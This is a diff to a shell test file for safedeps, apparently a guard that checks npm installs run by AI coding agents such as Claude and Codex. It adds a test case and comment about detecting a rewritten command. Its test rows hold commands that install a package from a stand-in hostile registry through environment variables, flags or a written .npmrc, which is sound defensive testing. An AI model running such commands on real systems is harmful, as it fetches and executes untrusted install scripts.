@@ -1044,6 +1044,10 @@ new_un1() { new_project; quiet_first "unset npm_config_userconfig; HOME=${XH_HOM
 #   quiet:<package>     confirmed quietly, and <package> rebuilt (`-`: nothing to check)
 #   denied:<reason>     the pre-guard denies it, saying <reason>; nothing is installed
 # A `fallback` may carry `:<text>` that the message must also say.
+# RH3c is RH3x with a record of the rewrite that the command did not carry
+# (engine `crossed`, npm-sandbox.sh): the Codex warning used to be left out
+# whenever the record said safedeps rewrote a command, and is now left out only
+# where the command received is the one it wrote.
 # The warning a later command gets for the impostor an earlier one fetched.
 WITHHELD_EVIL="the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from ${EVIL_REG}, which is not the public npm registry. They are kept. safedeps has recorded these bytes and withholds their install scripts in every project on this machine. This version has no way to release them: no tree that holds them is rebuilt automatically until a later release can approve a registry. If you trust that registry, confirm with the user before running \`npm rebuild sd-approved\` yourself; do not rebuild without asking"
 printf '# install scripts over the whole tree (id engine command | outcome)\n'
@@ -1153,6 +1157,7 @@ RH2|evilclone|claude|kept:because this install fetched sd-approved from ${EVIL_R
 RH3|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH3e|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
 RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
+RH3c|project|crossed|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not make the install inert (on Codex it cannot), so unless the command said --ignore-scripts, their install scripts already ran during the install|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
 RH4|project|claude|denied:Command uses non-standard npm registry|npm install --registry ${EVIL_REG} sd-approved@1.0.0
 RH5|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 RH1w|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
